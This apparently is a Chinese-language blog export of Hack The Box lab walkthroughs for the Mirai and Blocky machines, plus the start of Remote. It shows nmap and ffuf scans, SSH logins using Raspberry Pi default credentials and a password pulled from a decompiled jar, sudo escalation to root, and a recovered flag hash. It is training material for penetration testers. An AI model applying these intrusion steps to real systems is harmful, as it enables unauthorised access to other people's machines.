    <title>HTB-Mirai</title>
    <url>/Hackthebox/htb/htb-mirai/</url>
    <content><![CDATA[<style>.juiwlogfwcjx{zoom:50%;}</style><img src="/Hackthebox/htb/htb-mirai/4ef1ea77e69185063d4200d7d0142baa.png" class="juiwlogfwcjx">

<span id="more"></span>

<table>
<thead>
<tr>
<th>OS</th>
<th>Difficulty</th>
</tr>
</thead>
<tbody><tr>
<td>Linux</td>
<td>Easy</td>
</tr>
</tbody></table>
<h3 id="Nmap-Scan"><a href="#Nmap-Scan" class="headerlink" title="Nmap Scan"></a>Nmap Scan</h3><pre class="language-bash" data-language="bash"><code class="language-bash">$ nmap <span class="token number">10.10</span>.10.48 <span class="token parameter variable">-sV</span>  <span class="token parameter variable">-sC</span> -p- <span class="token parameter variable">-T4</span> --min-rate <span class="token number">1000</span> <span class="token parameter variable">-e</span> tun0 
Starting Nmap <span class="token number">7.95</span> <span class="token punctuation">(</span> https://nmap.org <span class="token punctuation">)</span> at <span class="token number">2025</span>-03-02 <span class="token number">11</span>:57 CST
Nmap scan report <span class="token keyword">for</span> <span class="token number">10.10</span>.10.48
Host is up <span class="token punctuation">(</span><span class="token number">0</span>.13s latency<span class="token punctuation">)</span>.
Not shown: <span class="token number">65343</span> closed tcp ports <span class="token punctuation">(</span>reset<span class="token punctuation">)</span>, <span class="token number">186</span> filtered tcp ports <span class="token punctuation">(</span>no-response<span class="token punctuation">)</span>
PORT      STATE SERVICE VERSION
<span class="token number">22</span>/tcp    <span class="token function">open</span>  <span class="token function">ssh</span>     OpenSSH <span class="token number">6</span>.7p1 Debian <span class="token number">5</span>+deb8u3 <span class="token punctuation">(</span>protocol <span class="token number">2.0</span><span class="token punctuation">)</span>
<span class="token operator">|</span> ssh-hostkey: 
<span class="token operator">|</span>   <span class="token number">1024</span> aa:ef:5c:e0:8e:86:97:82:47:ff:4a:e5:40:18:90:c5 <span class="token punctuation">(</span>DSA<span class="token punctuation">)</span>
<span class="token operator">|</span>   <span class="token number">2048</span> e8:c1:9d:c5:43:ab:fe:61:23:3b:d7:e4:af:9b:74:18 <span class="token punctuation">(</span>RSA<span class="token punctuation">)</span>
<span class="token operator">|</span>   <span class="token number">256</span> b6:a0:78:38:d0:c8:10:94:8b:44:b2:ea:a0:17:42:2b <span class="token punctuation">(</span>ECDSA<span class="token punctuation">)</span>
<span class="token operator">|</span>_  <span class="token number">256</span> 4d:68:40:f7:20:c4:e5:52:80:7a:44:38:b8:a2:a7:52 <span class="token punctuation">(</span>ED25519<span class="token punctuation">)</span>
<span class="token number">53</span>/tcp    <span class="token function">open</span>  domain  dnsmasq <span class="token number">2.76</span>
<span class="token operator">|</span> dns-nsid: 
<span class="token operator">|</span>_  bind.version: dnsmasq-2.76
<span class="token number">80</span>/tcp    <span class="token function">open</span>  http    lighttpd <span class="token number">1.4</span>.35
<span class="token operator">|</span>_http-title: Site doesn't have a title <span class="token punctuation">(</span>text/html<span class="token punctuation">;</span> <span class="token assign-left variable">charset</span><span class="token operator">=</span>UTF-8<span class="token punctuation">)</span>.
<span class="token operator">|</span>_http-server-header: lighttpd/1.4.35
<span class="token number">1686</span>/tcp  <span class="token function">open</span>  upnp    Platinum UPnP <span class="token number">1.0</span>.5.13 <span class="token punctuation">(</span>UPnP/1.0 DLNADOC/1.50<span class="token punctuation">)</span>
<span class="token number">32400</span>/tcp <span class="token function">open</span>  http    Plex Media Server httpd
<span class="token operator">|</span>_http-title: Unauthorized
<span class="token operator">|</span>_http-cors: HEAD GET POST PUT DELETE OPTIONS
<span class="token operator">|</span> http-auth: 
<span class="token operator">|</span> HTTP/1.1 <span class="token number">401</span> Unauthorized<span class="token punctuation">\</span>x0D
<span class="token operator">|</span>_  Server returned status <span class="token number">401</span> but no WWW-Authenticate header.
<span class="token operator">|</span>_http-favicon: Plex
<span class="token number">32469</span>/tcp <span class="token function">open</span>  upnp    Platinum UPnP <span class="token number">1.0</span>.5.13 <span class="token punctuation">(</span>UPnP/1.0 DLNADOC/1.50<span class="token punctuation">)</span>
Service Info: OS: Linux<span class="token punctuation">;</span> CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="token builtin class-name">.</span>
Nmap done: <span class="token number">1</span> IP address <span class="token punctuation">(</span><span class="token number">1</span> <span class="token function">host</span> up<span class="token punctuation">)</span> scanned <span class="token keyword">in</span> <span class="token number">122.17</span> seconds</code></pre>

<p>添加本地域名解析到hosts</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">$ <span class="token builtin class-name">echo</span> <span class="token string">'10.10.10.48 mirai.htb'</span> <span class="token operator">|</span> <span class="token function">sudo</span> <span class="token function">tee</span> <span class="token parameter variable">-a</span> /etc/hosts</code></pre>

<p>访问目标 <a href="http://mirai.htb/">http://mirai.htb</a> ,右键查看源码，找到一个路径</p>
<img src="/Hackthebox/htb/htb-mirai/image-20250302122107403.png" class="" title="源码">访问/admin 可以看到是树苺派

<img src="/Hackthebox/htb/htb-mirai/image-20250302122612935.png" class="" title="面板">

<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>使用树苺派默认凭证 pi:raspberry 登录SSH</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">ssh</span> pi@mirai.htb              
The authenticity of <span class="token function">host</span> <span class="token string">'mirai.htb (10.10.10.48)'</span> can<span class="token string">'t be established.
ED25519 key fingerprint is SHA256:TL7joF/Kz3rDLVFgQ1qkyXTnVQBTYrV44Y2oXyjOa60.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '</span>mirai.htb<span class="token string">' (ED25519) to the list of known hosts.
pi@mirai.htb'</span>s password: 

The programs included with the Debian GNU/Linux system are <span class="token function">free</span> software<span class="token punctuation">;</span>
the exact distribution terms <span class="token keyword">for</span> each program are described <span class="token keyword">in</span> the
individual files <span class="token keyword">in</span> /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sun Aug <span class="token number">27</span> <span class="token number">14</span>:47:50 <span class="token number">2017</span> from localhost

SSH is enabled and the default password <span class="token keyword">for</span> the <span class="token string">'pi'</span> user has not been changed.
This is a security risk - please login as the <span class="token string">'pi'</span> user and <span class="token builtin class-name">type</span> <span class="token string">'passwd'</span> to <span class="token builtin class-name">set</span> a new password.


SSH is enabled and the default password <span class="token keyword">for</span> the <span class="token string">'pi'</span> user has not been changed.
This is a security risk - please login as the <span class="token string">'pi'</span> user and <span class="token builtin class-name">type</span> <span class="token string">'passwd'</span> to <span class="token builtin class-name">set</span> a new password.

pi@raspberrypi:~ $ <span class="token function">id</span>
<span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">1000</span><span class="token punctuation">(</span>pi<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">1000</span><span class="token punctuation">(</span>pi<span class="token punctuation">)</span> <span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">1000</span><span class="token punctuation">(</span>pi<span class="token punctuation">)</span>,4<span class="token punctuation">(</span>adm<span class="token punctuation">)</span>,20<span class="token punctuation">(</span>dialout<span class="token punctuation">)</span>,24<span class="token punctuation">(</span>cdrom<span class="token punctuation">)</span>,27<span class="token punctuation">(</span>sudo<span class="token punctuation">)</span>,29<span class="token punctuation">(</span>audio<span class="token punctuation">)</span>,44<span class="token punctuation">(</span>video<span class="token punctuation">)</span>,46<span class="token punctuation">(</span>plugdev<span class="token punctuation">)</span>,60<span class="token punctuation">(</span>games<span class="token punctuation">)</span>,100<span class="token punctuation">(</span>users<span class="token punctuation">)</span>,101<span class="token punctuation">(</span>input<span class="token punctuation">)</span>,108<span class="token punctuation">(</span>netdev<span class="token punctuation">)</span>,117<span class="token punctuation">(</span>i2c<span class="token punctuation">)</span>,998<span class="token punctuation">(</span>gpio<span class="token punctuation">)</span>,999<span class="token punctuation">(</span>spi<span class="token punctuation">)</span>
</code></pre>

<h3 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h3><p>运行sudo -l 可以看到能直接切换root用户，查看root.txt 提示备份在USB stick</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">pi@raspberrypi:~ $ <span class="token function">sudo</span> <span class="token parameter variable">-l</span>
Matching Defaults entries <span class="token keyword">for</span> pi on localhost:
    env_reset, mail_badpass,
    <span class="token assign-left variable">secure_path</span><span class="token operator">=</span>/usr/local/sbin<span class="token punctuation">\</span>:/usr/local/bin<span class="token punctuation">\</span>:/usr/sbin<span class="token punctuation">\</span>:/usr/bin<span class="token punctuation">\</span>:/sbin<span class="token punctuation">\</span>:/bin

User pi may run the following commands on localhost:
    <span class="token punctuation">(</span>ALL <span class="token builtin class-name">:</span> ALL<span class="token punctuation">)</span> ALL
    <span class="token punctuation">(</span>ALL<span class="token punctuation">)</span> NOPASSWD: ALL
pi@raspberrypi:~ $ <span class="token function">sudo</span> <span class="token parameter variable">-i</span>

SSH is enabled and the default password <span class="token keyword">for</span> the <span class="token string">'pi'</span> user has not been changed.
This is a security risk - please login as the <span class="token string">'pi'</span> user and <span class="token builtin class-name">type</span> <span class="token string">'passwd'</span> to <span class="token builtin class-name">set</span> a new password.


SSH is enabled and the default password <span class="token keyword">for</span> the <span class="token string">'pi'</span> user has not been changed.
This is a security risk - please login as the <span class="token string">'pi'</span> user and <span class="token builtin class-name">type</span> <span class="token string">'passwd'</span> to <span class="token builtin class-name">set</span> a new password.

root@raspberrypi:~<span class="token comment"># ls</span>
root.txt
root@raspberrypi:~<span class="token comment"># cat root.txt </span>
I lost my original root.txt<span class="token operator">!</span> I think I may have a backup on my USB stick<span class="token punctuation">..</span>.
root@raspberrypi:~<span class="token comment"># </span></code></pre>

<p>查看驱动清单，进入&#x2F;media&#x2F;usbstick，查看 damnit.txt </p>
<pre class="language-bash" data-language="bash"><code class="language-bash">root@raspberrypi:/<span class="token comment"># df -hl</span>
Filesystem      Size  Used Avail Use% Mounted on
aufs            <span class="token number">8</span>.5G  <span class="token number">2</span>.8G  <span class="token number">5</span>.3G  <span class="token number">34</span>% /
tmpfs           100M  <span class="token number">4</span>.8M   96M   <span class="token number">5</span>% /run
/dev/sda1       <span class="token number">1</span>.3G  <span class="token number">1</span>.3G     <span class="token number">0</span> <span class="token number">100</span>% /lib/live/mount/persistence/sda1
/dev/loop0      <span class="token number">1</span>.3G  <span class="token number">1</span>.3G     <span class="token number">0</span> <span class="token number">100</span>% /lib/live/mount/rootfs/filesystem.squashfs
tmpfs           250M     <span class="token number">0</span>  250M   <span class="token number">0</span>% /lib/live/mount/overlay
/dev/sda2       <span class="token number">8</span>.5G  <span class="token number">2</span>.8G  <span class="token number">5</span>.3G  <span class="token number">34</span>% /lib/live/mount/persistence/sda2
devtmpfs         10M     <span class="token number">0</span>   10M   <span class="token number">0</span>% /dev
tmpfs           250M  <span class="token number">8</span>.0K  250M   <span class="token number">1</span>% /dev/shm
tmpfs           <span class="token number">5</span>.0M  <span class="token number">4</span>.0K  <span class="token number">5</span>.0M   <span class="token number">1</span>% /run/lock
tmpfs           250M     <span class="token number">0</span>  250M   <span class="token number">0</span>% /sys/fs/cgroup
tmpfs           250M  <span class="token number">8</span>.0K  250M   <span class="token number">1</span>% /tmp
/dev/sdb        <span class="token number">8</span>.7M   93K  <span class="token number">7</span>.9M   <span class="token number">2</span>% /media/usbstick
tmpfs            50M     <span class="token number">0</span>   50M   <span class="token number">0</span>% /run/user/999
tmpfs            50M     <span class="token number">0</span>   50M   <span class="token number">0</span>% /run/user/1000
root@raspberrypi:/<span class="token comment"># cd /media/usbstick</span>
root@raspberrypi:/media/usbstick<span class="token comment"># ls</span>
damnit.txt  lost+found

root@raspberrypi:/media/usbstick<span class="token comment"># cat damnit.txt </span>
Damnit<span class="token operator">!</span> Sorry <span class="token function">man</span> I accidentally deleted your files off the USB stick.
Do you know <span class="token keyword">if</span> there is any way to get them back?

<span class="token parameter variable">-James</span></code></pre>

<p>使用strings 查看字符串</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">root@raspberrypi:/media/usbstick<span class="token comment"># strings /dev/sdb </span>
<span class="token operator">></span>r <span class="token operator">&amp;</span>
/media/usbstick
lost+found
root.txt
damnit.txt
<span class="token operator">></span>r <span class="token operator">&amp;</span>
<span class="token operator">></span>r <span class="token operator">&amp;</span>
/media/usbstick
lost+found
root.txt
damnit.txt
<span class="token operator">></span>r <span class="token operator">&amp;</span>
/media/usbstick
<span class="token number">2</span><span class="token punctuation">]</span><span class="token number">8</span>^
lost+found
root.txt
damnit.txt
<span class="token operator">></span>r <span class="token operator">&amp;</span>
3d3e483143ff12ec505d026fa13e020b
Damnit<span class="token operator">!</span> Sorry <span class="token function">man</span> I accidentally deleted your files off the USB stick.
Do you know <span class="token keyword">if</span> there is any way to get them back?
<span class="token parameter variable">-James</span></code></pre>

<table>
<thead>
<tr>
<th align="left">Flag</th>
<th align="left">Path</th>
</tr>
</thead>
<tbody><tr>
<td align="left">Flag1</td>
<td align="left">&#x2F;home&#x2F;pi&#x2F;Desktop&#x2F;user.txt</td>
</tr>
<tr>
<td align="left">Flag2</td>
<td align="left">strings &#x2F;dev&#x2F;sdb</td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>Hackthebox</category>
      </categories>
      <tags>
        <tag>默认密码</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB-Blocky</title>
    <url>/Hackthebox/htb/htb-blocky/</url>
    <content><![CDATA[<style>.cploumjjqzwe{zoom:50%;}</style><img src="/Hackthebox/htb/htb-blocky/f412784c311bdf52c3655381d2c9cd21.png" class="cploumjjqzwe">

<span id="more"></span>

<table>
<thead>
<tr>
<th align="left">OS</th>
<th align="left">Difficulty</th>
</tr>
</thead>
<tbody><tr>
<td align="left">Linux</td>
<td align="left">Easy</td>
</tr>
</tbody></table>
<h3 id="Nmap-Scan"><a href="#Nmap-Scan" class="headerlink" title="Nmap Scan"></a>Nmap Scan</h3><pre class="language-bash" data-language="bash"><code class="language-bash">$ nmap <span class="token number">10.10</span>.10.37 <span class="token parameter variable">-sV</span>  <span class="token parameter variable">-sC</span> -p- <span class="token parameter variable">-T4</span>  <span class="token parameter variable">-e</span> tun0  
Starting Nmap <span class="token number">7.95</span> <span class="token punctuation">(</span> https://nmap.org <span class="token punctuation">)</span> at <span class="token number">2025</span>-03-02 <span class="token number">10</span>:43 CST
Nmap scan report <span class="token keyword">for</span> <span class="token number">10.10</span>.10.37
Host is up <span class="token punctuation">(</span><span class="token number">0</span>.13s latency<span class="token punctuation">)</span>.
Not shown: <span class="token number">65530</span> filtered tcp ports <span class="token punctuation">(</span>no-response<span class="token punctuation">)</span>
PORT      STATE  SERVICE   VERSION
<span class="token number">21</span>/tcp    <span class="token function">open</span>   <span class="token function">ftp</span>       ProFTPD <span class="token number">1.3</span>.5a
<span class="token number">22</span>/tcp    <span class="token function">open</span>   <span class="token function">ssh</span>       OpenSSH <span class="token number">7</span>.2p2 Ubuntu 4ubuntu2.2 <span class="token punctuation">(</span>Ubuntu Linux<span class="token punctuation">;</span> protocol <span class="token number">2.0</span><span class="token punctuation">)</span>
<span class="token operator">|</span> ssh-hostkey: 
<span class="token operator">|</span>   <span class="token number">2048</span> d6:2b:99:b4:d5:e7:53:ce:2b:fc:b5:d7:9d:79:fb:a2 <span class="token punctuation">(</span>RSA<span class="token punctuation">)</span>
<span class="token operator">|</span>   <span class="token number">256</span> 5d:7f:38:95:70:c9:be:ac:67:a0:1e:86:e7:97:84:03 <span class="token punctuation">(</span>ECDSA<span class="token punctuation">)</span>
<span class="token operator">|</span>_  <span class="token number">256</span> 09:d5:c2:04:95:1a:90:ef:87:56:25:97:df:83:70:67 <span class="token punctuation">(</span>ED25519<span class="token punctuation">)</span>
<span class="token number">80</span>/tcp    <span class="token function">open</span>   http      Apache httpd <span class="token number">2.4</span>.18
<span class="token operator">|</span>_http-server-header: Apache/2.4.18 <span class="token punctuation">(</span>Ubuntu<span class="token punctuation">)</span>
<span class="token operator">|</span>_http-title: Did not follow redirect to http://blocky.htb
<span class="token number">8192</span>/tcp  closed sophos
<span class="token number">25565</span>/tcp <span class="token function">open</span>   minecraft Minecraft <span class="token number">1.11</span>.2 <span class="token punctuation">(</span>Protocol: <span class="token number">127</span>, Message: A Minecraft Server, Users: <span class="token number">0</span>/20<span class="token punctuation">)</span>
Service Info: Host: <span class="token number">127.0</span>.1.1<span class="token punctuation">;</span> OSs: Unix, Linux<span class="token punctuation">;</span> CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="token builtin class-name">.</span>
Nmap done: <span class="token number">1</span> IP address <span class="token punctuation">(</span><span class="token number">1</span> <span class="token function">host</span> up<span class="token punctuation">)</span> scanned <span class="token keyword">in</span> <span class="token number">252.53</span> seconds</code></pre>

<p>添加本地域名解析到hosts文件</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">$ <span class="token builtin class-name">echo</span> <span class="token string">'10.10.10.37 blocky.htb'</span> <span class="token operator">|</span> <span class="token function">sudo</span> <span class="token function">tee</span> <span class="token parameter variable">-a</span> /etc/hosts</code></pre>

<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>访问网站可以看到cms为WordPress，可以在文章中找到一个用户名(notch)</p>
<img src="/Hackthebox/htb/htb-blocky/image-20250302111220868.png" class="" title="目标">

<p>使用ffuf 对目录进行扫描，访问 <a href="http://blocky.htb/plugins">http://blocky.htb/plugins</a> 发现两个jar包：griefprevention-1.11.2-3.1.1.298.jar 和 BlockyCore.jar</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">$ ffuf <span class="token parameter variable">-w</span> /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt:FUZZ <span class="token parameter variable">-u</span> http://blocky.htb/FUZZ  <span class="token parameter variable">-t</span> <span class="token number">100</span> <span class="token parameter variable">-ic</span>  

        /<span class="token string">'___\  /'</span>___<span class="token punctuation">\</span>           /'___<span class="token punctuation">\</span>       
       /<span class="token punctuation">\</span> <span class="token punctuation">\</span>__/ /<span class="token punctuation">\</span> <span class="token punctuation">\</span>__/  __  __  /<span class="token punctuation">\</span> <span class="token punctuation">\</span>__/       
       <span class="token punctuation">\</span> <span class="token punctuation">\</span> ,__<span class="token punctuation">\</span><span class="token punctuation">\</span> <span class="token punctuation">\</span> ,__<span class="token punctuation">\</span>/<span class="token punctuation">\</span> <span class="token punctuation">\</span>/<span class="token punctuation">\</span> <span class="token punctuation">\</span> <span class="token punctuation">\</span> <span class="token punctuation">\</span> ,__<span class="token punctuation">\</span>      
        <span class="token punctuation">\</span> <span class="token punctuation">\</span> <span class="token punctuation">\</span>_/ <span class="token punctuation">\</span> <span class="token punctuation">\</span> <span class="token punctuation">\</span>_/<span class="token punctuation">\</span> <span class="token punctuation">\</span> <span class="token punctuation">\</span>_<span class="token punctuation">\</span> <span class="token punctuation">\</span> <span class="token punctuation">\</span> <span class="token punctuation">\</span> <span class="token punctuation">\</span>_/      
         <span class="token punctuation">\</span> <span class="token punctuation">\</span>_<span class="token punctuation">\</span>   <span class="token punctuation">\</span> <span class="token punctuation">\</span>_<span class="token punctuation">\</span>  <span class="token punctuation">\</span> <span class="token punctuation">\</span>____/  <span class="token punctuation">\</span> <span class="token punctuation">\</span>_<span class="token punctuation">\</span>       
          <span class="token punctuation">\</span>/_/    <span class="token punctuation">\</span>/_/   <span class="token punctuation">\</span>/___/    <span class="token punctuation">\</span>/_/       

       v2.1.0-dev
________________________________________________

 :: Method           <span class="token builtin class-name">:</span> GET
 :: URL              <span class="token builtin class-name">:</span> http://blocky.htb/FUZZ
 :: Wordlist         <span class="token builtin class-name">:</span> FUZZ: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
 :: Follow redirects <span class="token builtin class-name">:</span> <span class="token boolean">false</span>
 :: Calibration      <span class="token builtin class-name">:</span> <span class="token boolean">false</span>
 :: Timeout          <span class="token builtin class-name">:</span> <span class="token number">10</span>
 :: Threads          <span class="token builtin class-name">:</span> <span class="token number">100</span>
 :: Matcher          <span class="token builtin class-name">:</span> Response status: <span class="token number">200</span>-299,301,302,307,401,403,405,500
________________________________________________

wiki                    <span class="token punctuation">[</span>Status: <span class="token number">301</span>, Size: <span class="token number">307</span>, Words: <span class="token number">20</span>, Lines: <span class="token number">10</span>, Duration: 113ms<span class="token punctuation">]</span>
wp-content              <span class="token punctuation">[</span>Status: <span class="token number">301</span>, Size: <span class="token number">313</span>, Words: <span class="token number">20</span>, Lines: <span class="token number">10</span>, Duration: 130ms<span class="token punctuation">]</span>
plugins                 <span class="token punctuation">[</span>Status: <span class="token number">301</span>, Size: <span class="token number">310</span>, Words: <span class="token number">20</span>, Lines: <span class="token number">10</span>, Duration: 125ms<span class="token punctuation">]</span>
wp-includes             <span class="token punctuation">[</span>Status: <span class="token number">301</span>, Size: <span class="token number">314</span>, Words: <span class="token number">20</span>, Lines: <span class="token number">10</span>, Duration: 121ms<span class="token punctuation">]</span>
javascript              <span class="token punctuation">[</span>Status: <span class="token number">301</span>, Size: <span class="token number">313</span>, Words: <span class="token number">20</span>, Lines: <span class="token number">10</span>, Duration: 197ms<span class="token punctuation">]</span>
wp-admin                <span class="token punctuation">[</span>Status: <span class="token number">301</span>, Size: <span class="token number">311</span>, Words: <span class="token number">20</span>, Lines: <span class="token number">10</span>, Duration: 118ms<span class="token punctuation">]</span>
phpmyadmin              <span class="token punctuation">[</span>Status: <span class="token number">301</span>, Size: <span class="token number">313</span>, Words: <span class="token number">20</span>, Lines: <span class="token number">10</span>, Duration: 109ms<span class="token punctuation">]</span>
server-status           <span class="token punctuation">[</span>Status: <span class="token number">403</span>, Size: <span class="token number">298</span>, Words: <span class="token number">22</span>, Lines: <span class="token number">12</span>, Duration: 152ms<span class="token punctuation">]</span>
:: Progress: <span class="token punctuation">[</span><span class="token number">220546</span>/220546<span class="token punctuation">]</span> :: Job <span class="token punctuation">[</span><span class="token number">1</span>/1<span class="token punctuation">]</span> :: <span class="token number">897</span> req/sec :: Duration: <span class="token punctuation">[</span><span class="token number">0</span>:04:56<span class="token punctuation">]</span> :: Errors: <span class="token number">0</span> ::</code></pre>

<img src="/Hackthebox/htb/htb-blocky/image-20250302110356493.png" class="" title="jar">

<p>反编译jar包发现密码<img src="/Hackthebox/htb/htb-blocky/image-20250302110940408.png" class="" title="反编译"></p>
<h3 id="SSH登录"><a href="#SSH登录" class="headerlink" title="SSH登录"></a>SSH登录</h3><p>使用获取到的用户名(notch)和密码成功登录SSH</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">ssh</span> notch@blocky.htb 
The authenticity of <span class="token function">host</span> <span class="token string">'blocky.htb (10.10.10.37)'</span> can<span class="token string">'t be established.
ED25519 key fingerprint is SHA256:ZspC3hwRDEmd09Mn/ZlgKwCv8I8KDhl9Rt2Us0fZ0/8.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '</span>blocky.htb<span class="token string">' (ED25519) to the list of known hosts.
notch@blocky.htb'</span>s password: 
Welcome to Ubuntu <span class="token number">16.04</span>.2 LTS <span class="token punctuation">(</span>GNU/Linux <span class="token number">4.4</span>.0-62-generic x86_64<span class="token punctuation">)</span>

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

<span class="token number">7</span> packages can be updated.
<span class="token number">7</span> updates are security updates.


Last login: Fri Jul  <span class="token number">8</span> 07:16:08 <span class="token number">2022</span> from <span class="token number">10.10</span>.14.29
To run a <span class="token builtin class-name">command</span> as administrator <span class="token punctuation">(</span>user <span class="token string">"root"</span><span class="token punctuation">)</span>, use <span class="token string">"sudo &lt;command>"</span><span class="token builtin class-name">.</span>
See <span class="token string">"man sudo_root"</span> <span class="token keyword">for</span> details.

notch@Blocky:~$ <span class="token function">id</span>
<span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">1000</span><span class="token punctuation">(</span>notch<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">1000</span><span class="token punctuation">(</span>notch<span class="token punctuation">)</span> <span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">1000</span><span class="token punctuation">(</span>notch<span class="token punctuation">)</span>,4<span class="token punctuation">(</span>adm<span class="token punctuation">)</span>,24<span class="token punctuation">(</span>cdrom<span class="token punctuation">)</span>,27<span class="token punctuation">(</span>sudo<span class="token punctuation">)</span>,30<span class="token punctuation">(</span>dip<span class="token punctuation">)</span>,46<span class="token punctuation">(</span>plugdev<span class="token punctuation">)</span>,110<span class="token punctuation">(</span>lxd<span class="token punctuation">)</span>,115<span class="token punctuation">(</span>lpadmin<span class="token punctuation">)</span>,116<span class="token punctuation">(</span>sambashare<span class="token punctuation">)</span>
notch@Blocky:~$ </code></pre>

<h3 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h3><p>运行sudo  -i 可以直接切换到root帐号</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">notch@Blocky:~$ <span class="token function">sudo</span> <span class="token parameter variable">-l</span>
<span class="token punctuation">[</span>sudo<span class="token punctuation">]</span> password <span class="token keyword">for</span> notch: 
Matching Defaults entries <span class="token keyword">for</span> notch on Blocky:
    env_reset, mail_badpass,
    <span class="token assign-left variable">secure_path</span><span class="token operator">=</span>/usr/local/sbin<span class="token punctuation">\</span>:/usr/local/bin<span class="token punctuation">\</span>:/usr/sbin<span class="token punctuation">\</span>:/usr/bin<span class="token punctuation">\</span>:/sbin<span class="token punctuation">\</span>:/bin<span class="token punctuation">\</span>:/snap/bin

User notch may run the following commands on Blocky:
    <span class="token punctuation">(</span>ALL <span class="token builtin class-name">:</span> ALL<span class="token punctuation">)</span> ALL
notch@Blocky:~$ <span class="token function">sudo</span> <span class="token parameter variable">-i</span> 
root@Blocky:~<span class="token comment"># id</span>
<span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span> <span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span>
</code></pre>

<table>
<thead>
<tr>
<th align="left">Flag</th>
<th align="left">Path</th>
</tr>
</thead>
<tbody><tr>
<td align="left">Flag1</td>
<td align="left">&#x2F;home&#x2F;notch&#x2F;user.txt</td>
</tr>
<tr>
<td align="left">Flag2</td>
<td align="left">&#x2F;root&#x2F;root.txt</td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>Hackthebox</category>
      </categories>
      <tags>
        <tag>密码重用</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB-Remote</title>
    <url>/Hackthebox/htb/htb-remote/</url>
    <content><![CDATA[<style>.ojjyrwdwysri{zoom:50%;}</style><img src="/Hackthebox/htb/htb-remote/8d7c152dc9c28c9556b07dc724c6a37b.png" class="ojjyrwdwysri">

<span id="more"></span>

<table>
<thead>
<tr>
<th align="left">OS</th>
<th align="left">Difficulty</th>
</tr>
</thead>
<tbody><tr>
<td align="left">Windows</td>
<td align="left">Easy</td>
</tr>
</tbody></table>
<h3 id="Nmap-Scan"><a href="#Nmap-Scan" class="headerlink" title="Nmap Scan"></a>Nmap Scan</h3><pre class="language-bash" data-language="bash"><code class="language-bash">$ nmap <span class="token number">10.10</span>.10.180 <span class="token parameter variable">-sV</span>  -p- <span class="token parameter variable">-T4</span> --min-rate <span class="token number">1000</span> <span class="token parameter variable">-e</span> tun0 
Starting Nmap <span class="token number">7.95</span> <span class="token punctuation">(</span> https://nmap.org <span class="token punctuation">)</span> at <span class="token number">2025</span>-02-23 <span class="token number">20</span>:44 CST
Nmap scan report <span class="token keyword">for</span> <span class="token number">10.10</span>.10.180
Host is up <span class="token punctuation">(</span><span class="token number">0</span>.13s latency<span class="token punctuation">)</span>.
Not shown: <span class="token number">65516</span> closed tcp ports <span class="token punctuation">(</span>reset<span class="token punctuation">)</span>
PORT      STATE    SERVICE       VERSION
<span class="token number">21</span>/tcp    <span class="token function">open</span>     <span class="token function">ftp</span>           Microsoft ftpd
<span class="token number">80</span>/tcp    <span class="token function">open</span>     http          Microsoft HTTPAPI httpd <span class="token number">2.0</span> <span class="token punctuation">(</span>SSDP/UPnP<span class="token punctuation">)</span>
<span class="token number">111</span>/tcp   <span class="token function">open</span>     rpcbind       <span class="token number">2</span>-4 <span class="token punctuation">(</span>RPC <span class="token comment">#100000)</span>
<span class="token number">135</span>/tcp   <span class="token function">open</span>     msrpc         Microsoft Windows RPC
<span class="token number">139</span>/tcp   <span class="token function">open</span>     netbios-ssn   Microsoft Windows netbios-ssn
<span class="token number">445</span>/tcp   <span class="token function">open</span>     microsoft-ds?
<span class="token number">2049</span>/tcp  <span class="token function">open</span>     nlockmgr      <span class="token number">1</span>-4 <span class="token punctuation">(</span>RPC <span class="token comment">#100021)</span>
<span class="token number">5985</span>/tcp  <span class="token function">open</span>     http          Microsoft HTTPAPI httpd <span class="token number">2.0</span> <span class="token punctuation">(</span>SSDP/UPnP<span class="token punctuation">)</span>
<span class="token number">15264</span>/tcp filtered unknown
<span class="token number">22011</span>/tcp filtered unknown
<span class="token number">47001</span>/tcp <span class="token function">open</span>     http          Microsoft HTTPAPI httpd <span class="token number">2.0</span> <span class="token punctuation">(</span>SSDP/UPnP<span class="token punctuation">)</span>
